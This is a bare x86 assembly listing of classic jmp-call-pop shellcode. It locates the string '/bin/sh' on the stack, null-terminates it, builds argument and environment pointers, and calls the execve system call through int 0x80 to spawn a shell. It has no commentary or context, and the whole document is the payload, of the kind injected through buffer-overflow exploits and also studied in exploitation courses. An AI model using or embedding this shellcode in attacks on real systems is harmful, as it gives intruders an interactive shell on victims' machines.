jmp want
got:
    xor eax, eax
    mov al, 0xb
    pop ebx
    xor edx, edx
    mov [ebx+0x07], dl
    mov [ebx+0x08], ebx
    mov [ebx+0x0c], edx
    lea ecx,[ebx+0x8]
    lea edx,[ebx+0xc]
    int 0x80
want:
    call got
    .ASCII "/bin/sh@AAAABBBB"

